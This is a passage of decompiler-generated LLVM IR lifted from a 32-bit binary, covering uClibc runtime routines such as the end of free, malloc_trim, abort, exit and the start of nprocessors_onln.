  %v1_8052d6c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  %v1_8052d71 = add i32 %arg1, -8
  store i32 %v1_8052d71, i32* %ecx.global-to-local, align 4
  %v0_8052d74 = load i8, i8* @global_var_805aa80.281, align 1
  %v1_8052d74 = sext i8 %v0_8052d74 to i32
  store i32 %v1_8052d74, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d71, i32* @edi, align 4
  %v1_8052d7e = add i32 %arg1, -4
  %v2_8052d7e = inttoptr i32 %v1_8052d7e to i32*
  %v3_8052d7e = load i32, i32* %v2_8052d7e, align 4
  store i32 %v3_8052d7e, i32* %edx.global-to-local, align 4
  %v1_8052d83 = and i32 %v3_8052d7e, -4
  %v4_8052d83 = trunc i32 %v1_8052d83 to i8
  store i32 %v1_8052d83, i32* @ebx, align 4
  %v8_8052d88 = icmp ugt i8 %v4_8052d83, %v0_8052d74
  br i1 %v8_8052d88, label %dec_label_pc_8052dad, label %dec_label_pc_8052d8a

dec_label_pc_8052d8a:                             ; preds = %dec_label_pc_8052d53
  %v1_8052d8c = or i32 %v1_8052d74, 3
  store i32 %v1_8052d8c, i32* %eax.global-to-local, align 4
  %v2_8052d8f = udiv i32 %v3_8052d7e, 8
  store i32 %v2_8052d8f, i32* %edx.global-to-local, align 4
  %v1_8052d92 = trunc i32 %v1_8052d8c to i8
  store i8 %v1_8052d92, i8* @global_var_805aa80.281, align 128
  %v1_8052d97 = mul nuw i32 %v2_8052d8f, 4
  %v2_8052d97 = add i32 %v1_8052d97, ptrtoint (i32* @global_var_805aa7c.282 to i32)
  %v3_8052d97 = inttoptr i32 %v2_8052d97 to i32*
  %v4_8052d97 = load i32, i32* %v3_8052d97, align 4
  store i32 %v4_8052d97, i32* %eax.global-to-local, align 4
  %v3_8052d9e = inttoptr i32 %arg1 to i32*
  store i32 %v4_8052d97, i32* %v3_8052d9e, align 4
  %v0_8052da1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052da1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052da1 = mul i32 %v1_8052da1, 4
  %v3_8052da1 = add i32 %v2_8052da1, ptrtoint (i32* @global_var_805aa7c.282 to i32)
  %v4_8052da1 = inttoptr i32 %v3_8052da1 to i32*
  store i32 %v0_8052da1, i32* %v4_8052da1, align 4
  br label %dec_label_pc_8052eb9

dec_label_pc_8052dad:                             ; preds = %dec_label_pc_8052d53
  %v1_8052dad = trunc i32 %v3_8052d7e to i8
  %v2_8052dad = and i8 %v1_8052dad, 2
  %v3_8052dad = icmp eq i8 %v2_8052dad, 0
  %v5_8052dad = zext i8 %v2_8052dad to i32
  %v7_8052dad = and i32 %v3_8052d7e, -256
  %v8_8052dad = or i32 %v5_8052dad, %v7_8052dad
  store i32 %v8_8052dad, i32* %edx.global-to-local, align 4
  %v1_8052db0 = icmp eq i1 %v3_8052dad, false
  br i1 %v1_8052db0, label %dec_label_pc_8052e9c, label %dec_label_pc_8052db6

dec_label_pc_8052db6:                             ; preds = %dec_label_pc_8052dad
  %v1_8052db6 = or i32 %v1_8052d74, 1
  %v3_8052db6 = trunc i32 %v1_8052db6 to i8
  store i32 %v1_8052db6, i32* %eax.global-to-local, align 4
  %v2_8052db9 = add i32 %v1_8052d83, %v1_8052d71
  store i32 %v2_8052db9, i32* @esi, align 4
  store i8 %v3_8052db6, i8* @global_var_805aa80.281, align 128
  %v1_8052dc1 = add i32 %v2_8052db9, 4
  %v2_8052dc1 = inttoptr i32 %v1_8052dc1 to i32*
  %v3_8052dc1 = load i32, i32* %v2_8052dc1, align 4
  store i32 %v3_8052dc1, i32* %eax.global-to-local, align 4
  %v2_8052dc4 = inttoptr i32 %v1_8052d7e to i8*
  %v3_8052dc4 = load i8, i8* %v2_8052dc4, align 1
  %v4_8052dc4 = urem i8 %v3_8052dc4, 2
  %v5_8052dc4 = icmp eq i8 %v4_8052dc4, 0
  store i32 %v3_8052dc1, i32* %stack_var_-36, align 4
  %v1_8052dcb = icmp eq i1 %v5_8052dc4, false
  br i1 %v1_8052dcb, label %dec_label_pc_8052dee, label %dec_label_pc_8052dcd

dec_label_pc_8052dcd:                             ; preds = %dec_label_pc_8052db6
  store i32 %v1_8052d71, i32* %eax.global-to-local, align 4
  %v2_8052dcf = inttoptr i32 %v1_8052d71 to i32*
  %v3_8052dcf = load i32, i32* %v2_8052dcf, align 4
  store i32 %v3_8052dcf, i32* @ebp, align 4
  %v2_8052dd2 = sub i32 %v1_8052d71, %v3_8052dcf
  store i32 %v2_8052dd2, i32* %eax.global-to-local, align 4
  %v1_8052dd4 = add i32 %v2_8052dd2, 8
  %v2_8052dd4 = inttoptr i32 %v1_8052dd4 to i32*
  %v3_8052dd4 = load i32, i32* %v2_8052dd4, align 4
  store i32 %v3_8052dd4, i32* %ecx.global-to-local, align 4
  %v1_8052dd7 = add i32 %v2_8052dd2, 12
  %v2_8052dd7 = inttoptr i32 %v1_8052dd7 to i32*
  %v3_8052dd7 = load i32, i32* %v2_8052dd7, align 4
  store i32 %v3_8052dd7, i32* %edx.global-to-local, align 4
  %v1_8052dda = add i32 %v3_8052dd4, 12
  %v2_8052dda = inttoptr i32 %v1_8052dda to i32*
  %v3_8052dda = load i32, i32* %v2_8052dda, align 4
  store i32 %v3_8052dda, i32* @edi, align 4
  %v12_8052ddd = icmp eq i32 %v3_8052dda, %v2_8052dd2
  %v1_8052ddf = icmp eq i1 %v12_8052ddd, false
  br i1 %v1_8052ddf, label %dec_label_pc_8052e1a, label %dec_label_pc_8052de1

dec_label_pc_8052de1:                             ; preds = %dec_label_pc_8052dcd
  %v1_8052de1 = add i32 %v3_8052dd7, 8
  %v2_8052de1 = inttoptr i32 %v1_8052de1 to i32*
  %v3_8052de1 = load i32, i32* %v2_8052de1, align 4
  %v15_8052de1 = icmp eq i32 %v3_8052de1, %v3_8052dda
  %v1_8052de4 = icmp eq i1 %v15_8052de1, false
  br i1 %v1_8052de4, label %dec_label_pc_8052e1a, label %dec_label_pc_8052de6

dec_label_pc_8052de6:                             ; preds = %dec_label_pc_8052de1
  %v2_8052de6 = add i32 %v3_8052dcf, %v1_8052d83
  store i32 %v2_8052de6, i32* @ebx, align 4
  store i32 %v3_8052dd7, i32* %v2_8052dda, align 4
  %v0_8052deb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052deb = load i32, i32* %edx.global-to-local, align 4
  %v2_8052deb = add i32 %v1_8052deb, 8
  %v3_8052deb = inttoptr i32 %v2_8052deb to i32*
  store i32 %v0_8052deb, i32* %v3_8052deb, align 4
  %v2_8052dee.pre = load i32, i32* %stack_var_-36, align 4
  %v0_8052df4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052dee

dec_label_pc_8052dee:                             ; preds = %dec_label_pc_8052db6, %dec_label_pc_8052de6
  %v1_8052e00 = phi i32 [ %v2_8052db9, %dec_label_pc_8052db6 ], [ %v0_8052df4.pre, %dec_label_pc_8052de6 ]
  %v2_8052dee = phi i32 [ %v3_8052dc1, %dec_label_pc_8052db6 ], [ %v2_8052dee.pre, %dec_label_pc_8052de6 ]
  %v1_8052df1 = and i32 %v2_8052dee, -4
  store i32 %v1_8052df1, i32* %ecx.global-to-local, align 4
  %v1_8052df4 = load i32, i32* @global_var_805aaac.283, align 4
  %v12_8052df4 = icmp eq i32 %v1_8052e00, %v1_8052df4
  br i1 %v12_8052df4, label %dec_label_pc_8052e4c, label %dec_label_pc_8052dfc

dec_label_pc_8052dfc:                             ; preds = %dec_label_pc_8052dee
  %v2_8052dfc = add i32 %v1_8052e00, 4
  %v3_8052dfc = add i32 %v1_8052df1, %v2_8052dfc
  %v4_8052dfc = inttoptr i32 %v3_8052dfc to i32*
  %v5_8052dfc = load i32, i32* %v4_8052dfc, align 4
  store i32 %v5_8052dfc, i32* %eax.global-to-local, align 4
  %v3_8052e00 = inttoptr i32 %v2_8052dfc to i32*
  store i32 %v1_8052df1, i32* %v3_8052e00, align 4
  %v0_8052e03 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e03 = urem i32 %v0_8052e03, 2
  %v2_8052e03 = icmp eq i32 %v1_8052e03, 0
  store i32 %v1_8052e03, i32* %eax.global-to-local, align 4
  %v1_8052e08 = icmp eq i1 %v2_8052e03, false
  br i1 %v1_8052e08, label %dec_label_pc_8052e27, label %dec_label_pc_8052e0a

dec_label_pc_8052e0a:                             ; preds = %dec_label_pc_8052dfc
  %v0_8052e0a = load i32, i32* @esi, align 4
  %v1_8052e0a = add i32 %v0_8052e0a, 8
  %v2_8052e0a = inttoptr i32 %v1_8052e0a to i32*
  %v3_8052e0a = load i32, i32* %v2_8052e0a, align 4
  store i32 %v3_8052e0a, i32* %edx.global-to-local, align 4
  %v1_8052e0d = add i32 %v0_8052e0a, 12
  %v2_8052e0d = inttoptr i32 %v1_8052e0d to i32*
  %v3_8052e0d = load i32, i32* %v2_8052e0d, align 4
  store i32 %v3_8052e0d, i32* %eax.global-to-local, align 4
  %v1_8052e10 = add i32 %v3_8052e0a, 12
  %v2_8052e10 = inttoptr i32 %v1_8052e10 to i32*
  %v3_8052e10 = load i32, i32* %v2_8052e10, align 4
  %v15_8052e10 = icmp eq i32 %v3_8052e10, %v0_8052e0a
  %v1_8052e13 = icmp eq i1 %v15_8052e10, false
  br i1 %v1_8052e13, label %dec_label_pc_8052e1a, label %dec_label_pc_8052e15

dec_label_pc_8052e15:                             ; preds = %dec_label_pc_8052e0a
  %v1_8052e15 = add i32 %v3_8052e0d, 8
  %v2_8052e15 = inttoptr i32 %v1_8052e15 to i32*
  %v3_8052e15 = load i32, i32* %v2_8052e15, align 4
  %v15_8052e15 = icmp eq i32 %v3_8052e15, %v0_8052e0a
  br i1 %v15_8052e15, label %dec_label_pc_8052e1f, label %dec_label_pc_8052e1a

dec_label_pc_8052e1a:                             ; preds = %dec_label_pc_8052de1, %dec_label_pc_8052dcd, %dec_label_pc_8052e15, %dec_label_pc_8052e0a
  %v0_8052e1a = call i32 @abort()
  store i32 %v0_8052e1a, i32* %eax.global-to-local, align 4
  %v1_8052e1f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052e1f

dec_label_pc_8052e1f:                             ; preds = %dec_label_pc_8052e15, %dec_label_pc_8052e1a
  %v1_8052e1f = phi i32 [ %v3_8052e0a, %dec_label_pc_8052e15 ], [ %v1_8052e1f.pre, %dec_label_pc_8052e1a ]
  %v0_8052e1f = phi i32 [ %v3_8052e0d, %dec_label_pc_8052e15 ], [ %v0_8052e1a, %dec_label_pc_8052e1a ]
  %v2_8052e1f = add i32 %v1_8052e1f, 12
  %v3_8052e1f = inttoptr i32 %v2_8052e1f to i32*
  store i32 %v0_8052e1f, i32* %v3_8052e1f, align 4
  %v0_8052e22 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e22 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e22 = add i32 %v1_8052e22, 8
  %v3_8052e22 = inttoptr i32 %v2_8052e22 to i32*
  store i32 %v0_8052e22, i32* %v3_8052e22, align 4
  %v0_8052e25 = load i32, i32* @ebx, align 4
  %v1_8052e25 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e25 = add i32 %v1_8052e25, %v0_8052e25
  store i32 %v2_8052e25, i32* @ebx, align 4
  br label %dec_label_pc_8052e27

dec_label_pc_8052e27:                             ; preds = %dec_label_pc_8052dfc, %dec_label_pc_8052e1f
  %v0_8052e27 = load i32, i32* @global_var_805aabc.285, align 4
  store i32 %v0_8052e27, i32* %eax.global-to-local, align 4
  %v0_8052e2c = load i32, i32* @edi, align 4
  %v1_8052e2c = add i32 %v0_8052e2c, 12
  %v2_8052e2c = inttoptr i32 %v1_8052e2c to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_8052e2c, align 4
  %v0_8052e33 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e33 = load i32, i32* @edi, align 4
  %v2_8052e33 = add i32 %v1_8052e33, 8
  %v3_8052e33 = inttoptr i32 %v2_8052e33 to i32*
  store i32 %v0_8052e33, i32* %v3_8052e33, align 4
  %v0_8052e36 = load i32, i32* @ebx, align 4
  %v1_8052e36 = load i32, i32* @edi, align 4
  %v3_8052e36 = add i32 %v1_8052e36, %v0_8052e36
  %v4_8052e36 = inttoptr i32 %v3_8052e36 to i32*
  store i32 %v0_8052e36, i32* %v4_8052e36, align 4
  %v0_8052e39 = load i32, i32* @edi, align 4
  %v1_8052e39 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e39 = add i32 %v1_8052e39, 12
  %v3_8052e39 = inttoptr i32 %v2_8052e39 to i32*
  store i32 %v0_8052e39, i32* %v3_8052e39, align 4
  %v0_8052e3c = load i32, i32* @ebx, align 4
  %v1_8052e3e = or i32 %v0_8052e3c, 1
  store i32 %v1_8052e3e, i32* %eax.global-to-local, align 4
  %v0_8052e41 = load i32, i32* @edi, align 4
  store i32 %v0_8052e41, i32* @global_var_805aabc.285, align 4
  %v2_8052e47 = add i32 %v0_8052e41, 4
  %v3_8052e47 = inttoptr i32 %v2_8052e47 to i32*
  store i32 %v1_8052e3e, i32* %v3_8052e47, align 4
  br label %dec_label_pc_8052e5c

dec_label_pc_8052e4c:                             ; preds = %dec_label_pc_8052dee
  %v0_8052e4c = load i32, i32* @ebx, align 4
  %v2_8052e4c = add i32 %v0_8052e4c, %v1_8052df1
  store i32 %v2_8052e4c, i32* @ebx, align 4
  %v0_8052e4e = load i32, i32* @edi, align 4
  store i32 %v0_8052e4e, i32* @global_var_805aaac.283, align 4
  %v1_8052e56 = or i32 %v2_8052e4c, 1
  store i32 %v1_8052e56, i32* %eax.global-to-local, align 4
  %v2_8052e59 = add i32 %v0_8052e4e, 4
  %v3_8052e59 = inttoptr i32 %v2_8052e59 to i32*
  store i32 %v1_8052e56, i32* %v3_8052e59, align 4
  br label %dec_label_pc_8052e5c

dec_label_pc_8052e5c:                             ; preds = %dec_label_pc_8052e27, %dec_label_pc_8052e4c
  %v0_8052e5c = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8052e5c, 131072
  br i1 %tmp21, label %dec_label_pc_8052eb9, label %dec_label_pc_8052e64

dec_label_pc_8052e64:                             ; preds = %dec_label_pc_8052e5c
  %v0_8052e64 = load i8, i8* @global_var_805aa80.281, align 128
  %v1_8052e64 = and i8 %v0_8052e64, 2
  %v2_8052e64 = icmp eq i8 %v1_8052e64, 0
  br i1 %v2_8052e64, label %dec_label_pc_8052e78, label %dec_label_pc_8052e6d

dec_label_pc_8052e6d:                             ; preds = %dec_label_pc_8052e64
  %v2_8052e72 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805aa80.281 to i32*))
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e78

dec_label_pc_8052e78:                             ; preds = %dec_label_pc_8052e64, %dec_label_pc_8052e6d
  %v0_8052e78 = load i32, i32* @global_var_805aaac.283, align 4
  store i32 %v0_8052e78, i32* %eax.global-to-local, align 4
  %v1_8052e7d = add i32 %v0_8052e78, 4
  %v2_8052e7d = inttoptr i32 %v1_8052e7d to i32*
  %v3_8052e7d = load i32, i32* %v2_8052e7d, align 4
  %v1_8052e80 = and i32 %v3_8052e7d, -4
  store i32 %v1_8052e80, i32* %eax.global-to-local, align 4
  %v1_8052e83 = load i32, i32* @global_var_805adc4.300, align 4
  %v7_8052e83 = icmp ult i32 %v1_8052e80, %v1_8052e83
  br i1 %v7_8052e83, label %dec_label_pc_8052eb9, label %dec_label_pc_8052e8b

dec_label_pc_8052e8b:                             ; preds = %dec_label_pc_8052e78
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* @edx, align 4
  %v0_8052e90 = load i32, i32* @global_var_805adc8.298, align 8
  store i32 %v0_8052e90, i32* @eax, align 4
  %v0_8052e95 = call i32 @__malloc_trim()
  store i32 %v0_8052e95, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052eb9

dec_label_pc_8052e9c:                             ; preds = %dec_label_pc_8052dad
  %v2_8052e9c = inttoptr i32 %v1_8052d71 to i32*
  %v3_8052e9c = load i32, i32* %v2_8052e9c, align 4
  store i32 %v3_8052e9c, i32* %edx.global-to-local, align 4
  %v0_8052e9f = load i32, i32* @global_var_805add0.291, align 16
  %v1_8052e9f = add i32 %v0_8052e9f, -1
  store i32 %v1_8052e9f, i32* @global_var_805add0.291, align 16
  %v2_8052ea5 = add i32 %v3_8052e9c, %v1_8052d83
  store i32 %v2_8052ea5, i32* %eax.global-to-local, align 4
  %v2_8052ea8 = sub i32 %v1_8052d71, %v3_8052e9c
  store i32 %v2_8052ea8, i32* %ecx.global-to-local, align 4
  %v0_8052eab = load i32, i32* @global_var_805ade4.294, align 4
  %v2_8052eab = sub i32 %v0_8052eab, %v2_8052ea5
  store i32 %v2_8052eab, i32* @global_var_805ade4.294, align 4
  %v2_8052eb2 = call i32 @munmap(i32 %v2_8052ea8, i32 %v2_8052ea5)
  store i32 %v2_8052eb2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052eb9

dec_label_pc_8052eb9:                             ; preds = %dec_label_pc_8052e78, %dec_label_pc_8052e5c, %dec_label_pc_8052e8b, %dec_label_pc_8052d8a, %dec_label_pc_8052e9c
  store i32 %v2_8052d5d, i32* %eax.global-to-local, align 4
  %v3_8052ec0 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8052ec0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ec7

dec_label_pc_8052ec7:                             ; preds = %entry, %dec_label_pc_8052eb9
  %.0 = phi i32 [ undef, %entry ], [ %v3_8052ec0, %dec_label_pc_8052eb9 ]
  store i32 %v0_8052d43, i32* @ebx, align 4
  store i32 %v0_8052d42, i32* @esi, align 4
  store i32 %v0_8052d41, i32* @edi, align 4
  store i32 %v0_8052d40, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8052e9c, { 1, 0, 2 }
  uselistorder i32 %v0_8052e36, { 1, 0 }
  uselistorder i32 %v1_8052e03, { 1, 0 }
  uselistorder i32 %v2_8052dfc, { 1, 0 }
  uselistorder i32 %v1_8052df1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052e00, { 1, 0 }
  uselistorder i32 %v2_8052d8f, { 1, 0 }
  uselistorder i32 %v3_8052d7e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8052d71, { 1, 6, 3, 5, 2, 0, 4, 7 }
  uselistorder i32* %edx.global-to-local, { 0, 7, 8, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %ecx.global-to-local, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 16, 13, 14, 15, 17, 18, 19, 20, 21, 24, 25, 22, 23, 26, 27, 4, 7, 5, 6, 8, 9, 10, 11, 12 }
  uselistorder i32* bitcast (i8* @global_var_805aa80.281 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805aab4.287 to i32), { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32* @global_var_805aaac.283, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8057ba8.280 to i32), { 4, 0, 5, 1, 8, 6, 2, 7, 3, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8052ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8052eb9, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8052e78, { 1, 0 }
  uselistorder label %dec_label_pc_8052e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8052e27, { 1, 0 }
  uselistorder label %dec_label_pc_8052e1f, { 1, 0 }
  uselistorder label %dec_label_pc_8052e1a, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8052dee, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052ecf = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8052ed9 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805aa80.281 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* @edx, align 4
  %v0_8052ee4 = load i32, i32* @ebx, align 4
  store i32 %v0_8052ee4, i32* @eax, align 4
  store i32 %v0_8052ecf, i32* @ebx, align 4
  %v0_8052ee7 = call i32 @__malloc_trim()
  ret i32 %v0_8052ee7

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805aa80.281 to i32), { 6, 5, 1, 4, 3, 0, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 2, 1, 3, 4 }
  uselistorder i8* @global_var_805aa80.281, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_8052ef5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057bc0.302 to i32))
  store i32 32, i32* %stack_var_-12, align 4
  %v2_8052f0c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8052f0c, i32* %eax.global-to-local, align 4
  %v3_8052f13 = bitcast i32* %stack_var_-12 to %_TYPEDEF_sigset_t*
  %v4_8052f13 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8052f13, i32 0)
  store i32 %v4_8052f13, i32* %eax.global-to-local, align 4
  %v0_8052f1b = load i8, i8* @global_var_8057d94.303, align 4
  %v1_8052f1b = icmp eq i8 %v0_8052f1b, 0
  %v1_8052f22 = icmp eq i1 %v1_8052f1b, false
  br i1 %v1_8052f22, label %dec_label_pc_8052f49, label %dec_label_pc_8052f24

dec_label_pc_8052f24:                             ; preds = %entry
  store i8 1, i8* @global_var_8057d94.303, align 4
  br label %dec_label_pc_8052f2b

dec_label_pc_8052f2b:                             ; preds = %dec_label_pc_8052f52, %dec_label_pc_8052f24
  %v1_8052f30 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057bc0.302 to i32))
  store i32 %v1_8052f30, i32* %eax.global-to-local, align 4
  %v1_8052f37 = call i32 @__GI_raise(i32 6)
  store i32 %v1_8052f37, i32* %eax.global-to-local, align 4
  %v1_8052f41 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057bc0.302 to i32))
  store i32 %v1_8052f41, i32* %eax.global-to-local, align 4
  %v0_8052f49.pre = load i8, i8* @global_var_8057d94.303, align 4
  br label %dec_label_pc_8052f49

dec_label_pc_8052f49:                             ; preds = %entry, %dec_label_pc_8052f2b
  %v2_8052f49 = phi i32 [ %v4_8052f13, %entry ], [ %v1_8052f41, %dec_label_pc_8052f2b ]
  %v0_8052f49 = phi i8 [ %v0_8052f1b, %entry ], [ %v0_8052f49.pre, %dec_label_pc_8052f2b ]
  %v1_8052f49 = zext i8 %v0_8052f49 to i32
  %v3_8052f49 = and i32 %v2_8052f49, -256
  %v4_8052f49 = or i32 %v1_8052f49, %v3_8052f49
  store i32 %v4_8052f49, i32* %eax.global-to-local, align 4
  %v10_8052f4e = icmp eq i8 %v0_8052f49, 1
  %v1_8052f50 = icmp eq i1 %v10_8052f4e, false
  br i1 %v1_8052f50, label %dec_label_pc_8052f85, label %dec_label_pc_8052f52

dec_label_pc_8052f52:                             ; preds = %dec_label_pc_8052f49
  %v2_8052f52 = ptrtoint i32* %stack_var_-32 to i32
  store i8 2, i8* @global_var_8057d94.303, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v4_8052f61 = load i1, i1* @df, align 1
  %v5_8052f61 = select i1 %v4_8052f61, i32 -4, i32 4
  %v6_8052f61 = add i32 %v5_8052f61, %v2_8052f52
  store i32 %v6_8052f61, i32* %edi.global-to-local, align 4
  %v2_8052f62 = inttoptr i32 %v6_8052f61 to i32*
  store i32 0, i32* %v2_8052f62, align 4
  %v3_8052f62 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052f62 = add i32 %v3_8052f62, %v5_8052f61
  store i32 %v6_8052f62, i32* %edi.global-to-local, align 4
  %v0_8052f63 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f63 = inttoptr i32 %v6_8052f62 to i32*
  store i32 %v0_8052f63, i32* %v2_8052f63, align 4
  %v3_8052f63 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052f63 = add i32 %v3_8052f63, %v5_8052f61
  store i32 %v6_8052f63, i32* %edi.global-to-local, align 4
  %v0_8052f64 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f64 = inttoptr i32 %v6_8052f63 to i32*
  store i32 %v0_8052f64, i32* %v2_8052f64, align 4
  %v3_8052f64 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052f64 = add i32 %v3_8052f64, %v5_8052f61
  store i32 %v6_8052f64, i32* %edi.global-to-local, align 4
  %v0_8052f65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f65 = inttoptr i32 %v6_8052f64 to i32*
  store i32 %v0_8052f65, i32* %v2_8052f65, align 4
  %v4_8052f7b = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-32, i32 0)
  store i32 %v4_8052f7b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f2b

dec_label_pc_8052f85:                             ; preds = %dec_label_pc_8052f49
  %v10_8052f85 = icmp eq i8 %v0_8052f49, 2
  %v1_8052f87 = icmp eq i1 %v10_8052f85, false
  br i1 %v1_8052f87, label %dec_label_pc_8052f91, label %dec_label_pc_8052f91.thread

dec_label_pc_8052f91.thread:                      ; preds = %dec_label_pc_8052f85
  store i8 3, i8* @global_var_8057d94.303, align 4
  br label %dec_label_pc_8052f9a

dec_label_pc_8052f91:                             ; preds = %dec_label_pc_8052f85
  %v9_8052f91 = icmp eq i8 %v0_8052f49, 3
  %v1_8052f98 = icmp eq i1 %v9_8052f91, false
  br i1 %v1_8052f98, label %dec_label_pc_8052fa8, label %dec_label_pc_8052f9a

dec_label_pc_8052f9a:                             ; preds = %dec_label_pc_8052f91.thread, %dec_label_pc_8052f91
  store i8 4, i8* @global_var_8057d94.303, align 4
  %v1_8052fa3 = call i32 @__GI__exit(i32 127)
  store i32 %v1_8052fa3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fa8

dec_label_pc_8052fa8:                             ; preds = %dec_label_pc_8052f91, %dec_label_pc_8052f9a, %dec_label_pc_8052fa8
  br label %dec_label_pc_8052fa8

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i8 3, { 0, 5, 1, 2, 3, 4 }
  uselistorder i8* @global_var_8057d94.303, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052fa8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052f9a, { 1, 0 }
  uselistorder label %dec_label_pc_8052f49, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v12_8052fae = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %v12_8052fae, i32* @ebx, align 4
  %v4_8052fc4 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134559876, i32 ptrtoint (i32* @global_var_8057bd8.304 to i32))
  %v1_8052fce = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057bd8.304 to i32))
  %v0_8052fd3 = load i32, i32* @global_var_8057d98.305, align 8
  %v1_8052fde = icmp eq i32 %v0_8052fd3, 0
  br i1 %v1_8052fde, label %dec_label_pc_8052fe6, label %dec_label_pc_8052fe2

dec_label_pc_8052fe2:                             ; preds = %entry
  %v0_8052fe2 = load i32, i32* @esi, align 4
  %v1_8052fe3 = call i32 @__libc_errno(i32 %v0_8052fe2)
  br label %dec_label_pc_8052fe6

dec_label_pc_8052fe6:                             ; preds = %entry, %dec_label_pc_8052fe2
  %v3_8052fe9 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8052fee = call i32 @__GI___uClibc_fini()
  store i32 134564023, i32* @eax, align 4
  %v0_8052ffe = call i32 @_stdio_term()
  %v0_8053003 = load i32, i32* @esi, align 4
  %v1_8053004 = call i32 @__GI__exit(i32 %v0_8053003)
  ret i32 %v1_8053004

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8057bd8.304 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8052fe6, { 1, 0 }
}

define i32 @nprocessors_onln(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v15_805300f = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* %stack_var_-16, align 4
  %v1_805301e = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_8055f10.306 to i32))
  store i32 %v1_805301e, i32* @eax, align 4
  %v1_8053026 = icmp eq i32 %v1_805301e, 0
  br i1 %v1_8053026, label %dec_label_pc_8053076, label %dec_label_pc_805302a

dec_label_pc_805302a:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
